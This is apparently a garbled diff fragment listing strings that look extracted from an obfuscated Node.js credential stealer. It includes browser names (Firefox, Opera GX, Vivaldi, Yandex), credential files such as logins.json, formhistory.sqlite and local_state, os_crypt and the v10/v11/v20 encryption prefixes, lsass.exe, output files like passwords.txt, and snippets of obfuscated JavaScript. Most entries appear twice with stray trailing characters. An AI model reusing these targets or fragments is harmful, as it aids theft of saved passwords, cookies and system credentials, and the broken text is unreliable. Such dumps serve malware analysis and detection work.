+firefox_beta
+firefox_dev
+firefox_esr
+firefox_nightly
+flag
+form-data\
+form-data�
+formhistory.sqlite\
+formhistory.sqlite�
+fs-extra\
+fs-extra�
+fs/promises\
+fs/promises�
+gecko
+history.txt\
+history.txt�
+http\
+https\
+https�
+http�
+key_name
+l62otq\
+l62otq�
+local_state
+logins.json\
+logins.json�
+lsass.exe\
+lsass.exe�
+msedge.exe
+name
+node-stream-zip\
+node-stream-zip�
+nr7WpJ\
+nr7WpJ�
+opera
+opera.exe
+opera_gx
+os_crypt\
+os_crypt�
+passwords.txt\
+passwords.txt�
+path\
+path�
+places.sqlite\
+places.sqlite�
+process_name
+rSl3Jqa\
+rSl3Jqa�
+replace
+roots\
+roots�
+sGfw8J\
+sGfw8J�
+sqlite3\
+sqlite3�
+type
+url\
+url�
+utf-8
+util\
+util�
+v10\
+v10�
+v11\
+v11�
+v20\
+v20�
+var zR_3mo,Mwe5hP,zMTPE5W,vPkyaI,ziFfzJn,R01Xodj,UGn3r8,ZmaojfE,VEEQ4dy,xOlYoR,JNlQeG,oXWOQ5q,Qtd1pJb,WSNqvxI;const Q4Ysb_=[\
+var zR_3mo,Mwe5hP,zMTPE5W,vPkyaI,ziFfzJn,R01Xodj,UGn3r8,ZmaojfE,VEEQ4dy,xOlYoR,JNlQeG,oXWOQ5q,Qtd1pJb,WSNqvxI;const Q4Ysb_=[�
+vivaldi
+vivaldi.exe
+yandex
+{name}\\t{url}\
+{name}\t{url}�
+{url}\\t{title_str}\\t{visit_count}\\t{date_str}\
+{url}\\t{title}\\t{visit_count}\\t{date_str}\
+{url}\t{title_str}\t{visit_count}\t{date_str}�
+{url}\t{title}\t{visit_count}\t{date_str}�
+}for(Qtd1pJb[Q4Ysb_[0x4]]=oXWOQ5q,ziFfzJn=oXWOQ5q,TV9xde.push(oXWOQ5q);;){if(jSWlSc8.index>zMTPE5W[Q4Ysb_[0x2]])return \
+}for(Qtd1pJb[Q4Ysb_[0x4]]=oXWOQ5q,ziFfzJn=oXWOQ5q,TV9xde.push(oXWOQ5q);;){if(jSWlSc8.index>zMTPE5W[Q4Ysb_[0x2]])return �
